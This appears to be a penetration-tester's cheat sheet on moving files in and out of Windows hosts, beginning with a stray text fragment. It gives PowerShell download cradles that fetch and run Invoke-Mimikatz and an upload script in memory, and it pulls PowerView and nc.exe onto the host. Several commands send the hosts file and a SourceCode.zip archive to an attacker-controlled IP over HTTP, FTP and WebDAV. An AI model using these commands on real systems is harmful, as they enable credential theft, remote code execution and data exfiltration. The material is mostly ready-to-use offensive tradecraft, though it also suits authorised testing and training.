pyth## Downloads

### PowerShell DownloadFile Method

```powershell
## Downloading from HTTP/HTTPS Server
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

## Invoking file directly w/o downloading file
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

### PowerShell Invoke-WebRequest

```bash
## PowerShell 3.0 onwards
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

### SMB Downloads

```bash
## Create SMB server for download
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```powershell
net use n: \\192.168.220.133\share /user:test test

## Copy file from remote SMB established
copy \\192.168.220.133\share\nc.exe
```

### FTP Downloads

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

## Uploads

### PowerShell Web Upload

```powershell
## Create uploading server
pip3 install uploadserver
python3 -m uploadserver

## Normal file upload
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

## Base64 file upload
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

### SMB Uploads

WebDAV extension of HTTP/HTTPS - Enables webserver to behave like a fileserver
```bash
sudo pip install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

```powershell
## DavWWWRoot is a special keyword recognized by the Windows Shell, which handles WebDAV requests that you are connecting to the root of the WebDAV server.
dir \\192.168.49.128\DavWWWRoot

copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\

copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

### FTP Uploads

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

## Encoding/Decoding

### Base64 Encoding

```powershell
## Encoding file
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

## Specific text encoding
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Text))
```

### Base64 Decoding

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\<filetosave>", [Convert]::FromBase64String("<base64-string>"))
```